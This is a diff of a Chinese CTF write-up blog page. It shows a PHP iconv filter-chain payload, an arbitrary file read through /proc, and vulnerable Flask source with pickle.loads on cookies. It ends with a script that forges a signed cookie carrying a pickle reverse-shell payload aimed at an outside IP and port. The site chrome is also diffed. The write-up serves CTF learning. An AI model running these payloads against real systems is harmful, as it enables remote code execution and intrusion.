F7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=2.php</span></span><br></pre></td></tr></table></figure>
 
-# 9.9第二次
-
-# 任意文件读取
-
-/proc/self/cmdline，/proc/1/cmdline，直接访问docker的配置文件
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/3d85279c-image.png)
-
-# pickle反序列化
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取 /app/app.py</span><br></pre></td></tr></table></figure>
+<h1 id="9-9第二次"><a href="#9-9第二次" class="headerlink" title="9.9第二次"></a>9.9第二次</h1><h1 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h1><p>&#x2F;proc&#x2F;self&#x2F;cmdline，&#x2F;proc&#x2F;1&#x2F;cmdline，直接访问docker的配置文件</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/3d85279c-image.png" alt="image.png"></p>
+<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取 /app/app.py</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import random</span><br><span class="line"><span class="keyword">from</span> config.secret_key import secret_code</span><br><span class="line"><span class="keyword">from</span> flask import Flask, make_response, request, render_template</span><br><span class="line"><span class="keyword">from</span> cookie import set_cookie, cookie_check, get_cookie</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">app.secret_key = random.<span class="title function_ invoke__">randbytes</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserData</span>:</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>, <span class="title">username</span>):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">username</span> = <span class="title">username</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">waf</span>(<span class="title">data</span>):</span></span><br><span class="line"><span class="class">    <span class="title">blacklist</span> = [<span class="title">b</span>&#x27;<span class="title">R</span>&#x27;, <span class="title">b</span>&#x27;<span class="title">secret</span>&#x27;, <span class="title">b</span>&#x27;<span class="title">eval</span>&#x27;, <span class="title">b</span>&#x27;<span class="title">file</span>&#x27;, <span class="title">b</span>&#x27;<span class="title">compile</span>&#x27;, <span class="title">b</span>&#x27;<span class="title">open</span>&#x27;, <span class="title">b</span>&#x27;<span class="title">os</span>.<span class="title">popen</span>&#x27;]</span></span><br><span class="line"><span class="class">    <span class="title">for</span> <span class="title">word</span> <span class="title">in</span> <span class="title">blacklist</span>:</span></span><br><span class="line"><span class="class">        <span class="title">if</span> <span class="title">word</span>.<span class="title">lower</span>() <span class="title">in</span> <span class="title">data</span>.<span class="title">lower</span>():</span></span><br><span class="line"><span class="class">            <span class="title">return</span> <span class="title">True</span></span></span><br><span class="line"><span class="class">    <span class="title">return</span> <span class="title">False</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">app</span>.<span class="title">route</span>(&quot;/&quot;, <span class="title">methods</span>=[&#x27;<span class="title">GET</span>&#x27;])</span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">index</span>():</span></span><br><span class="line"><span class="class">    <span class="title">return</span> <span class="title">render_template</span>(&#x27;<span class="title">index</span>.<span class="title">html</span>&#x27;)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">app</span>.<span class="title">route</span>(&quot;/<span class="title">lyrics</span>&quot;, <span class="title">methods</span>=[&#x27;<span class="title">GET</span>&#x27;])</span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">lyrics</span>():</span></span><br><span class="line"><span class="class">    <span class="title">resp</span> = <span class="title">make_response</span>()</span></span><br><span class="line"><span class="class">    <span class="title">resp</span>.<span class="title">headers</span>[&quot;<span class="title">Content</span>-<span class="title">Type</span>&quot;] = &#x27;<span class="title">text</span>/<span class="title">plain</span>; <span class="title">charset</span>=<span class="title">UTF</span>-8&#x27;</span></span><br><span class="line"><span class="class">    <span class="title">query</span> = <span class="title">request</span>.<span class="title">args</span>.<span class="title">get</span>(&quot;<span class="title">lyrics</span>&quot;)</span></span><br><span class="line"><span class="class">    <span class="title">path</span> = <span class="title">os</span>.<span class="title">path</span>.<span class="title">join</span>(<span class="title">os</span>.<span class="title">getcwd</span>(), &quot;<span class="title">lyrics</span>&quot;, <span class="title">query</span>)</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">    <span class="title">try</span>:</span></span><br><span class="line"><span class="class">        <span class="title">with</span> <span class="title">open</span>(<span class="title">path</span>, &#x27;<span class="title">r</span>&#x27;) <span class="title">as</span> <span class="title">f</span>:</span></span><br><span class="line"><span class="class">            <span class="title">res</span> = <span class="title">f</span>.<span class="title">read</span>()</span></span><br><span class="line"><span class="class">    <span class="title">except</span> <span class="title">FileNotFoundError</span>:</span></span><br><span class="line"><span class="class">        <span class="title">return</span> &quot;<span class="title">No</span> <span class="title">lyrics</span> <span class="title">found</span>&quot;</span></span><br><span class="line"><span class="class">    <span class="title">except</span> <span class="title">Exception</span> <span class="title">as</span> <span class="title">e</span>:</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">f</span>&quot;<span class="title">Error</span>: </span>&#123;<span class="title function_ invoke__">str</span>(e)&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return res</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&quot;</span>/login<span class="string">&quot;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span></span><br><span class="line"><span class="string">def login():</span></span><br><span class="line"><span class="string">    if request.method == &#x27;POST&#x27;:</span></span><br><span class="line"><span class="string">        username = request.form[&quot;</span>username<span class="string">&quot;]</span></span><br><span class="line"><span class="string">        user = UserData(username)</span></span><br><span class="line"><span class="string">        res = &#123;&quot;</span>username<span class="string">&quot;: user.username&#125;</span></span><br><span class="line"><span class="string">        return set_cookie(&quot;</span>user<span class="string">&quot;, res, secret=secret_code)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return render_template(&#x27;login.html&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&quot;</span>/board<span class="string">&quot;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="string">def board():</span></span><br><span class="line"><span class="string">    if cookie_check(&quot;</span>user<span class="string">&quot;, secret=secret_code):</span></span><br><span class="line"><span class="string">        return &quot;</span>Nope, invalid code get out!<span class="string">&quot;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    data = get_cookie(&quot;</span>user<span class="string">&quot;, secret=secret_code)</span></span><br><span class="line"><span class="string">    if isinstance(data, bytes):</span></span><br><span class="line"><span class="string">        data = pickle.loads(data)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    if not isinstance(data, dict) or &quot;</span>username<span class="string">&quot; not in data:</span></span><br><span class="line"><span class="string">        return render_template(&#x27;user.html&#x27;, name=&quot;</span>guest<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    if data[&quot;</span>username<span class="string">&quot;] == &quot;</span>admin<span class="string">&quot;:</span></span><br><span class="line"><span class="string">        return render_template(&#x27;admin.html&#x27;, name=data[&quot;</span>username<span class="string">&quot;])</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return render_template(&#x27;user.html&#x27;, name=data[&quot;</span>username<span class="string">&quot;])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;</span>__main__<span class="string">&quot;:</span></span><br><span class="line"><span class="string">    os.chdir(os.path.dirname(__file__))</span></span><br><span class="line"><span class="string">    app.run(host=&quot;</span><span class="number">0.0</span>.<span class="number">0.0</span><span class="string">&quot;, port=9292)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
 
-通过import可以找到密钥的位置
-
+<p>通过import可以找到密钥的位置</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/app/config/secret_key.py</span><br><span class="line">secret_code = <span class="string">&quot;EnjoyThePlayTime123456&quot;</span></span><br></pre></td></tr></table></figure>
 
-可以读取到加密算法
-
+<p>可以读取到加密算法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/cookie.py</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">waf</span>(data):</span><br><span class="line">    blacklist = [b<span class="string">&#x27;R&#x27;</span>, b<span class="string">&#x27;secret&#x27;</span>, b<span class="string">&#x27;eval&#x27;</span>, b<span class="string">&#x27;file&#x27;</span>, b<span class="string">&#x27;compile&#x27;</span>, b<span class="string">&#x27;open&#x27;</span>, b<span class="string">&#x27;os.popen&#x27;</span>]</span><br><span class="line">    valid = False</span><br><span class="line">    <span class="keyword">for</span> word in blacklist:</span><br><span class="line">        <span class="keyword">if</span> word in data:</span><br><span class="line">            valid = True</span><br><span class="line">            <span class="comment"># print(word)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> valid</span><br></pre></td></tr></table></figure>
 
-我们可以看到并不是由app.py触发的，从login路由触发set_cookie
-
-把我们的命令加密，抓包替换/board的参数，反弹shell绕waf即可，在环境变量里面面可以看到flag
-
+<p>我们可以看到并不是由app.py触发的，从login路由触发set_cookie</p>
+<p>把我们的命令加密，抓包替换&#x2F;board的参数，反弹shell绕waf即可，在环境变量里面面可以看到flag</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import hashlib</span><br><span class="line">import hmac</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">unicode = str</span><br><span class="line">basestring = str</span><br><span class="line">secret_code = <span class="string">&quot;EnjoyThePlayTime123456&quot;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">cookie_encode</span>(data, key):</span><br><span class="line">    msg = base64.<span class="title function_ invoke__">b64encode</span>(payload.<span class="title function_ invoke__">encode</span>())</span><br><span class="line">    sig = base64.<span class="title function_ invoke__">b64encode</span>(hmac.<span class="keyword">new</span>(<span class="title function_ invoke__">tob</span>(key), msg, digestmod=hashlib.md5).<span class="title function_ invoke__">digest</span>())</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">tob</span>(<span class="string">&#x27;!&#x27;</span>) + sig + <span class="title function_ invoke__">tob</span>(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">tob</span>(s, enc=<span class="string">&#x27;utf8&#x27;</span>):</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_ invoke__">encode</span>(enc) <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(s, unicode) <span class="keyword">else</span> <span class="title function_ invoke__">bytes</span>(s)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;(S&#x27;</span>bash -c <span class="string">&quot;/bin/sh -i &gt;&amp; /dev/tcp/198.23.148.51/7777 0&gt;&amp;1&quot;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">cookie_encode</span>(payload,secret_code))</span><br></pre></td></tr></table></figure>
 
-​
-
----
-
-来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/bw3m4dlpd2v2gduu
-语雀文档ID: 184541772
-
+<p>​</p>
+<hr>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/bw3m4dlpd2v2gduu">https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/bw3m4dlpd2v2gduu</a><br>语雀文档ID: 184541772</p>
 
     </div>
 
@@ -406,9 +353,11 @@ mb_substr是按字来切分字符，而mb_strcut是按字节来切分字符，�
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
               <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+              <a href="/tags/HNUCTF/" rel="tag"># HNUCTF</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
           </div>
 
         
@@ -482,6 +431,7 @@ mb_substr是按字来切分字符，而mb_strcut是按字节来切分字符，�
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#wp"><span class="nav-number">1.</span> <span class="nav-text">wp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-29%E7%AC%AC%E4%B8%80%E6%AC%A1"><span class="nav-number">2.</span> <span class="nav-text">8.29第一次</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93"><span class="nav-number">2.1.</span> <span class="nav-text">知识总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%83%E9%80%B8%E9%83%A8%E5%88%86"><span class="nav-number">2.1.1.</span> <span class="nav-text">逃逸部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mb-substr%E5%92%8Cmb-strpos%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E5%BC%95%E8%B5%B7%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.2.</span> <span class="nav-text">mb_substr和mb_strpos解析差异引起的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#filterchain"><span class="nav-number">2.1.3.</span> <span class="nav-text">filterchain</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#filer%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84write%E5%92%8Cread"><span class="nav-number">2.1.4.</span> <span class="nav-text">filer伪协议的write和read</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#9-9%E7%AC%AC%E4%BA%8C%E6%AC%A1"><span class="nav-number">3.</span> <span class="nav-text">9.9第二次</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">4.</span> <span class="nav-text">任意文件读取</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">pickle反序列化</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -497,7 +447,7 @@ mb_substr是按字来切分字符，而mb_strcut是按字节来切分字符，�
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -510,7 +460,7 @@ mb_substr是按字来切分字符，而mb_strcut是按字节来切分字符，�
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
